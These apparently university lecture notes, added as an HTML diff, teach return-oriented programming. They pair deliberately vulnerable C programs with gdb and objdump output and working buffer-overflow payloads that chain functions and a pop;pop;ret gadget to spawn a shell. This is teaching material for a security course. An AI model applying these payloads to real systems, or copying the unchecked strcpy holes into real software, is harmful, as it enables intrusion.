@@ -1,0 +1,779 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-27 Fri 18:12 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 23: Gadgets in Return Oriented Programs</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 23: Gadgets in Return Oriented Programs</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline5">1. Return Oriented Programming: Function Chaining Gadgets</a>
+<ul>
+<li><a href="#orgheadline1">1.1. Overwriting the return address with function calls</a></li>
+<li><a href="#orgheadline2">1.2. Functions with Arguments</a></li>
+<li><a href="#orgheadline3">1.3. Chaining Two Functions with Arguments</a></li>
+<li><a href="#orgheadline4">1.4. Chaining Three or More Functions with Arguments</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline9">2. ROP Gadgets</a>
+<ul>
+<li><a href="#orgheadline6">2.1. Hunting a Gadget</a></li>
+<li><a href="#orgheadline7">2.2. Using the gadget</a></li>
+<li><a href="#orgheadline8">2.3. Where do we go from here?</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-2">
+<h2 id="orgheadline5"><span class="section-number-2">1</span> Return Oriented Programming: Function Chaining Gadgets</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Return Oriented Programming or (ROP) is the process of using small
+sequences of code (or gadgets) that are embedded in other code. The
+"return" portion of the code comes from the fact that these small
+pieces of code, or gadgets, all end with a return statement. The
+concept is that while there may be protections in places to stop you
+from loading shell code, we can leverage the code already within our
+target program.
+</p>
+
+<p>
+As an additional benefit for ROP, similar to the benefit from
+return-2-libc, is that there a ROP chain is functional even when the
+stack memory is labeled non-executable and there is memory address
+randomization. The reason is that we are only going to use already
+existing code to build an exploit, namely code that is in the .text
+segment, so it is already labeled executable. Moreover, the .text
+segment isn't randomized with ASLR, so it will <i>always</i> be
+consistently in the same place. This means this style of attack is
+really powerful and really consistent.
+</p>
+
+
+<p>
+Below, we follow an example using of ROP where we use it to properly
+chain function calls together, but we will also look at an example
+where the ROP itself, without calling any other function, is capable
+of launching a shell. Also note, that ll the code we are working with
+in this lesson are compiled <i>without</i> executable stacks, so we can't
+easily load shell code <sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>.
+</p>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-3">
+<h3 id="orgheadline1"><span class="section-number-3">1.1</span> Overwriting the return address with function calls</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+Let's start with a simple example of where ROPs become very
+useful. Consider the following code where we want bad() to get called
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"You've been PWNED!\n"</span>);
+
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[100];
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"Buf: %s\n"</span>, buf);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+    vuln(argv[1]);
+}
+</pre>
+</div>
+
+<p>
+We know how to solve this one: we overflow the buffer and we overwrite
+the return the address for vuln() with bad(). To do this, first we can
+look at the disassembled code to see where the buffer is declared
+into relation to the return address:
+</p>
+
+<pre class="example">
+ser@si485H-base:demo$ objdump -d -M intel call_bad
+(...)
+0804847d &lt;bad&gt;:
+ 804847d:	55                   	push   ebp
+ 804847e:	89 e5                	mov    ebp,esp
+ 8048480:	83 ec 18             	sub    esp,0x18
+ 8048483:	c7 04 24 70 85 04 08 	mov    DWORD PTR [esp],0x8048570
+ 804848a:	e8 c1 fe ff ff       	call   8048350 &lt;puts@plt&gt;
+ 804848f:	c9                   	leave  
+ 8048490:	c3      
+(...)
+08048491 &lt;vuln&gt;:
+ 8048491:	55                   	push   ebp
+ 8048492:	89 e5                	mov    ebp,esp
+ 8048494:	81 ec 88 00 00 00    	sub    esp,0x88
+ 804849a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 804849d:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 80484a1:	8d 45 94             	lea    eax,[ebp-0x6c]
+ 80484a4:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484a7:	e8 94 fe ff ff       	call   8048340 &lt;strcpy@plt&gt;
+ 80484ac:	8d 45 94             	lea    eax,[ebp-0x6c]
+ 80484af:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 80484b3:	c7 04 24 83 85 04 08 	mov    DWORD PTR [esp],0x8048583
+ 80484ba:	e8 71 fe ff ff       	call   8048330 &lt;printf@plt&gt;
+ 80484bf:	c9                   	leave  
+ 80484c0:	c3                   	ret    
+(...)
+</pre>
+
+<p>
+We see that the buffer is allocated at <code>ebp-0x6c</code> so we can quickly do
+the exploit like so where we jump to bad():
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./call_bad `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08'"`
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}?
+You've been PWNED!
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">1.2</span> Functions with Arguments</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+We can make the exploit a little more intriguing if we were to make so
+that bad() will call system() with it's argument:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">char</span> <span style="color: #eedd82;">pwn</span>[]=<span style="color: #ffa07a;">"/bin/sh"</span>;
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  printf(<span style="color: #ffa07a;">"You've been PWNED!\n"</span>);
+
+  system(s);
+
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[100];
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"Buf: %s\n"</span>, buf);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+    vuln(argv[1]);
+}
+</pre>
+</div>
+
+<p>
+In this scenario, much like a return-2-libc attack, if we have the
+stack properly aligned with the right argument, namely <code>pwn</code>, then
+we'll get a shell to launch. For that to happen, we'll need the
+exploit on the stack to look like this:
+</p>
+
+<pre class="example">
+|     &lt;addr pwn&gt;     |
+|  bad's ret address |
+|     &lt;addr bad&gt;     |
+</pre>
+
+<p>
+That is, the address of bad overwrites the return address of vuln. The
+next item in the stack will be bad's return address, which we don't
+need to worry about; however, the following item is the first argument
+to bad, which should be pwn.
+</p>
+
+<p>
+To complete this exploit, we determine the address of pwn and bad, and
+give it a go.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ gdb -q call_bad_sh
+Reading symbols from call_bad_sh...done.
+(gdb) x/x pwn
+0x804a02c &lt;pwn&gt;:	0x6e69622f
+(gdb) x/x bad
+0x80484ad &lt;bad&gt;:	0x83e58955
+(gdb) quit
+
+user@si485H-base:demo$ ./call_bad_sh `python -c "print 'A'*(0x6c+4) + '\xad\x84\x04\x08' + '\xfe\xbe\xad\xde' + '\x2c\xa0\x04\x08'"`
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????,?
+You've been PWNED!
+$
+</pre>
+
+<p>
+That's not too bad. 
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">1.3</span> Chaining Two Functions with Arguments</h3>
+<div class="outline-text-3" id="text-1-3">
+<p>
+Let's add a bit more complexity to this exploit. Suppose now we want
+to make a call to another function first before calling bad(), and the
+arguments to those functions matter.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">char</span> <span style="color: #eedd82;">pwn</span>[100];
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bin_sh</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">magicbeef</span>){
+  <span style="color: #00ffff;">if</span> (magicbeef == 0xdeadbeef){
+    strcat(pwn,<span style="color: #ffa07a;">"/bin/sh"</span>);
+  }
+  printf(<span style="color: #ffa07a;">"pwn: %s\n"</span>,pwn);
+
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  printf(<span style="color: #ffa07a;">"You've been PWNED!\n"</span>);
+
+  system(s);
+
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[100];
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"Buf: %s\n"</span>, buf);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+  pwn[0]=<span style="color: #ffa07a;">'\0'</span>;
+  vuln(argv[1]);
+}
+</pre>
+</div>
+
+<p>
+This time we need to first call bin<sub>sh</sub>() with magicbeef being deadbeef
+and then we need to call bad() afterwards to get our shell. This might
+seem like no problem, at first, but once we try it out, you'll see
+where the challenge arises.
+</p>
+
+<p>
+Starting with the easy part, we can look at what the stack should be
+to properly call bin<sub>sh</sub>:
+</p>
+
+<pre class="example">
+|      0xdeadbeef       |
+|  bin_sh's ret address |
+|     &lt;addr bin_sh&gt;     |
+</pre>
+
+<p>
+We overwrite the return address of vuln() with the address of bin<sub>sh</sub>()
+where it's arguments is 0xdeadbeef. Before, in the last example, we
+didn't consider the return address of the function we jumped to, but
+this time we have to. What is the next function we call? bad(). So
+what we really need for the stack is to look like this.
+</p>
+
+<pre class="example">
+|     &lt;addr pwn&gt;        |
+|      0xdeadbeef       |
+|     &lt;addr bad&gt;        |
+|     &lt;addr bin_sh&gt;     |
+</pre>
+
+<p>
+If you follow the stack, the argument to bin<sub>sh</sub>() is 0xdeadbeef and
+its return address is bad(). The argument to bad() is <code>pwn</code>, and the
+return address for bad is 0xdeadbeef, which doesn't matter because at
+this point we have the shell.
+</p>
+
+<p>
+Let's give it a try:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ gdb -q call_bad_chain
+Reading symbols from call_bad_chain...done.
+(gdb) x/x pwn
+0x804a060 &lt;pwn&gt;:	0x00000000
+(gdb) x/x bad
+0x8048505 &lt;bad&gt;:	0x83e58955
+(gdb) x/x bin_sh
+0x80484ad &lt;bin_sh&gt;:	0x57e58955
+(gdb) quit
+user@si485H-base:demo$ ./call_bad_chain `python -c "print 'A'*(0x6c+4) + '\xad\x84\x04\x08' +'\x05\x85\x04\x08' +'\xef\xbe\xad\xde' + '\x60\xa0\x04\x08'"`
+Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?ﾭ?`?
+pwn: /bin/sh
+You've been PWNED!
+$
+</pre>
+
+<p>
+It's a shell! Great. 
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">1.4</span> Chaining Three or More Functions with Arguments</h3>
+<div class="outline-text-3" id="text-1-4">
+<p>
+It's about to fall apart. Consider what happens when we need to call
+another function in this chain. Where could it go?  Right now we have
+this.
+</p>
+
+<pre class="example">
+|     &lt;addr pwn&gt;        |
+|      0xdeadbeef       | &lt;-- bad's return addres is bin_sh's argument
+|     &lt;addr bad&gt;        |
+|     &lt;addr bin_sh&gt;     |
+</pre>
+
+<p>
+The slot for bad's return address is already being used for the
+argument to bin<sub>sh</sub>. We're hosed. Worse, consider what would happen in
+this code example where one of the functions needs to take <b>two</b>
+arguments:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">char</span> <span style="color: #eedd82;">pwn</span>[100];
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">add_bin</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">magiccafe</span>, <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">magicfood</span>){
+  <span style="color: #00ffff;">if</span> (magiccafe == 0xcafebabe &amp;&amp; magicfood == 0x0badf00d){
+    strcat(pwn,<span style="color: #ffa07a;">"/bin"</span>);
+  }
+
+  printf(<span style="color: #ffa07a;">"add_bin: pwn: %s\n"</span>, pwn);
+}
+
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">add_sh</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">magicbeef</span>){
+  <span style="color: #00ffff;">if</span> (magicbeef == 0xdeadbeef){
+    strcat(pwn,<span style="color: #ffa07a;">"/sh"</span>);
+  }
+
+  printf(<span style="color: #ffa07a;">"add_sh: pwn: %s\n"</span>, pwn);
+}
+
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  printf(<span style="color: #ffa07a;">"You've been PWNED!\n"</span>);
+
+  system(s);
+
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">s</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[100];
+
+  strcpy(buf,s);
+
+  printf(<span style="color: #ffa07a;">"Buf: %s\n"</span>, buf);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+  pwn[0]=<span style="color: #ffa07a;">'\0'</span>;
+  vuln(argv[1]);
+}
+</pre>
+</div>
+<p>
+Now, the construction of the <i>bin/sh string is in two parts, and one
+of the functions requires /two</i> arguments. Looks like our luck ran
+out and this is impossible, but just in case, let's try looking at the stack anyway.
+</p>
+
+<p>
+Starting with the first function add<sub>bin</sub> and it's two arguments which
+should be followed by <code>add_sh</code>, we'd need something like this:
+</p>
+<pre class="example">
+|      0x0badf00d      |
+|      0xcafebade      |
+|      &lt;addr add_sh&gt;   |
+|     &lt;addr add_bin&gt;   |
+</pre>
+<p>
+That's possible, but then what happens: we've reached an
+impasse. add<sub>sh</sub>() takes one argument and the way the stack is
+alligned, that argument is 0x0badf00d. That's just not what we need
+&#x2014; we need 0xdeadbeef.
+</p>
+
+<p>
+It would seem like this is impossible, but think about what we could
+do if we were able to clear the stack. Suppose we had a gadget or
+little function that only did pop;pop;ret then we could jump there
+instead of add<sub>sh</sub>() and clear out the stack before the next
+return. Something like the following:
+</p>
+
+<pre class="example">
+|     &lt;addr pwn&gt;         |
+|     0xdeadbeef         |
+|     &lt;addr bad&gt;         |
+|     &lt;addr add_sh&gt;      |
+|     0x0badf00d         |
+|     0xcafebabe         |
+|     &lt;addr pop;pop;ret&gt; |
+|     &lt;addr add_bin&gt;     |
+</pre>
+
+<p>
+If you follow the function chain, after ad<sub>bin</sub>() is called with
+arguments 0xcafebade and 0x0badf00d, the next function to run is a
+gadget that pops 0xcafebabe and 0x0badf00d off the stack. When the
+gadget returns, the next address on the stack is add<sub>sh</sub>() with the
+argument 0xdeadbeef. The return address of add<sub>sh</sub>() is bad(), and thus
+the exploit completes.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline9" class="outline-2">
+<h2 id="orgheadline9"><span class="section-number-2">2</span> ROP Gadgets</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+We've been doing a bit of return oriented programming already, but now
+we really get into it. The big idea was to chain a bunch of functions
+together through their return address to complete a task. That is a
+form of return oriented programming, but now we need something
+different. We need a very specific kind of an expression, a
+<code>pop;popl;ret</code> which is not a typical function that we can write. How
+do we find such a thing?
+</p>
+
+<p>
+The answer lies in the code itself. While we as programmers of C will
+never explicitly write a function that is just <code>pop;pop;ret</code>, the C
+compiler will most certainly compile instructions that contain that
+sequence of instructions. We describe that sequence as a <i>gadget</i>
+because it unintentionally gives us the functionality we need, and it
+ends in a return statement so it can be chained with other function
+calls.
+</p>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">2.1</span> Hunting a Gadget</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+The key now is to hunt down the gadget we need. For that, we can use
+objdump and grep. For reference the -A option with grep prints the
+specified number of lines <i>after</i> a match, and the -B option with grep
+prints the specified number of lines <i>before</i> a match.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel call_bad_doublechain | grep -B 3  ret | grep -A 3 pop  
+ 8048335:	5b                   	pop    ebx
+ 8048336:	c3                   	ret    
+--
+
+--
+ 8048508:	5f                   	pop    edi
+ 8048509:	5d                   	pop    ebp
+ 804850a:	c3                   	ret    
+--
+ 8048556:	83 c4 14             	add    esp,0x14
+ 8048559:	5f                   	pop    edi
+ 804855a:	5d                   	pop    ebp
+ 804855b:	c3                   	ret    
+--
+ 8048571:	89 04 24             	mov    DWORD PTR [esp],eax
+--
+ 804862d:	5e                   	pop    esi
+ 804862e:	5f                   	pop    edi
+ 804862f:	5d                   	pop    ebp
+ 8048630:	c3                   	ret    
+--
+ 804863f:	90                   	nop
+--
+ 8048656:	5b                   	pop    ebx
+ 8048657:	c3                   	ret
+</pre>
+
+<p>
+The search terms above looked for any return statement, printing the 3
+previous lines. Then the following grep searched for a pop statement,
+printing the 3 lines after. The result, above, shows us where there is
+instance of a <code>pop;pop;ret;</code>, at address 0x08048508. What is also
+important with this gadget is that we don't care to where the data is
+being popped, to any of the registers is fine, as long as it is being
+popped off the stack.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">2.2</span> Using the gadget</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+With this information in place, we can complete the exploit by first
+identifying the other important address and lining up our stack like
+below:
+</p>
+
+<pre class="example">
+|     &lt;addr pwn&gt;         |
+|     0xdeadbeef         |
+|     &lt;addr bad&gt;         |
+|     &lt;addr add_sh&gt;      |
+|     0x0badf00d         |
+|     0xcafebabe         |
+|     &lt;addr pop;pop;ret&gt; |
+|     &lt;addr add_bin&gt;     |
+</pre>
+
+<p>
+We can use gdb to find the other addresses:
+</p>
+<pre class="example">
+user@si485H-base:demo$ gdb -q call_bad_doublechain
+Reading symbols from call_bad_doublechain...done.
+(gdb) x/x add_bin
+0x80484ad &lt;add_bin&gt;:	0x57e58955
+(gdb) x/x add_sh
+0x804850b &lt;add_sh&gt;:	0x57e58955
+(gdb) x/x bad
+0x804855c &lt;bad&gt;:	0x83e58955
+(gdb) x/x pwn
+0x804a060 &lt;pwn&gt;:	0x00000000
+(gdb) quit
+
+user@si485H-base:demo$ ./call_bad_doublechain `python -c "s='A'*(0x6c+4); 
+s+='\xad\x84\x04\x08'; 
+s+='\x08\x85\x04\x08'; 
+s+='\xbe\xba\xfe\xca';
+s+='\x0d\xf0\xad\x0b';
+s+='\x0b\x85\x04\x08';
+s+='\x5c\x85\x04\x08';
+s+='\xef\xbe\xad\xde';
+s+='\x60\xa0\x04\x08';
+print s; "`
+?uf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????
+
+ \ﾭ?`?
+add_bin: pwn: /bin
+add_sh: pwn: /bin/sh
+You've been PWNED!
+$
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-3">
+<h3 id="orgheadline8"><span class="section-number-3">2.3</span> Where do we go from here?</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+In this example, we used a gadget within the code that did a simple
+task of chaining functions with different numbers of arguments. What
+if we were to do something more interesting? What if we were able to
+find enough gadgets to build a complete exploit? That idea is called
+ROP exploits, and believe it or not, you can do a <i>complete</i> exploit
+with shell code using <i>only</i> small gadgets. And, yes, it is as awesome
+as it sounds!
+</p>
+</div>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1">1</a></sup> <div class="footpara"><p class="footpara">
+Much of the ROP examples are adapted from <a href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html">CodeArcanna</a> article by Alex Reese, Tue 28 May 2013. 
+</p></div></div>
+
+
+</div>
+</div></div>
+</body>
+</html>
